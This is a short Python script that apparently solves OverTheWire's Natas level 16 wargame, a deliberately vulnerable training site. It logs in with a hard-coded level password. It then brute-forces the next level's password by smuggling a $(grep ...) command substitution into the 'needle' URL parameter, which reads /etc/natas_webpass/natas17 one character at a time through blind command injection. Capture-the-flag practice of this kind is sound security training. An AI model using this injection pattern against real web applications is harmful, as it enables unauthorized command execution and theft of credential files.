import requests
from requests.auth import HTTPBasicAuth

# used to login to the current level  
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  

# stores the password as we find out using the loop
passwd = ''  

allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
  
for i in range(32):  
 for char in allchars:
  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=African$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)  
    
  # checks wether the text returned after the above request consists of the word "African"
  if 'African' not in r.text:  
   passwd = passwd + char  
   print(passwd)  
   break  
